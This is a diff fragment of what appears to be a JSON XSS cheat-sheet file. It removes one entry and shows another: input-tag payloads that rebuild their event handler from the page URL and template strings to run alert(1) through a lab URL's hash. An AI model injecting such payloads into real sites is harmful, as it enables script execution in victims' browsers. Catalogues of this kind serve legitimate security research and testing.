@@ -294,13 +294,6 @@
     "hash": "#${alert(1)}"
   },
   {
-    "description": "Attributes and input with onfocus event with payload concealed in URL and template strings",
-    "code": "<input onfocus=\"attributes[0].value=id+URL+id,new onfocus\" id=` autofocus>",
-    "browsers": ["chrome", "firefox", "safari", "edge"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%3Cinput%20onfocus=%22attributes[0].value=id%2bURL%2bid,new%20onfocus%22%20id=%60%20autofocus%3E",
-    "hash": "#${alert(1)}"
-  },
-  {
     "description": "Attributes and input with onclick event with payload concealed in URL and template strings requires two clicks",
     "code": "<input onclick=attributes[0].value='`'+URL+'`'>",
     "browsers": ["chrome", "firefox", "safari", "edge"],
